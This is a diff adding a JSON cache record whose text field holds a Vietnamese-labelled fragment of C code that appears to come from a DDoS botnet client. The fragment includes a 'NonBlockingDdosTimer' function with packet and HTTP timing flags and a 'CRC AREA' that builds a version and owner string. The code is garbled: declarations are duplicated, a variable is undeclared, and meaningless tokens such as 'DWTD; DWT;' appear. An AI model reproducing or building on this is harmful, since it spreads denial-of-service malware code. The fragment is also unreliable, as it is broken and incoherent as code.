@@ -1,0 +1,5 @@
+{
+  "cache_key": "31ca84e0689c7ac1c784",
+  "provider_request_id": null,
+  "text": "N\u1ed9i dung: DWORD WINAPI NonBlockingDdosTimer(LPVOID) { bool bTimerIsHttpRelated = bStoreParameter; bool bPacketAccountable = bStoreParameter2; DWORD dwTotalMilliseconds = dwStoreParameter * 1000; DWORD dwElapsedMilliseconds = 0; DWORD dwElapsedSeconds = 0; //DBU!-------! CRC AREA START !----!> char cCheckString[DEFAULT]; sprintf(ContackString, \"%s--%s\", Version, cOwner); DWORD dwTotalMilliseconds = dwStoreParameter * 1000; DWORD dwElapsedMilliseconds = 0; DWTD; DWT;"
+}
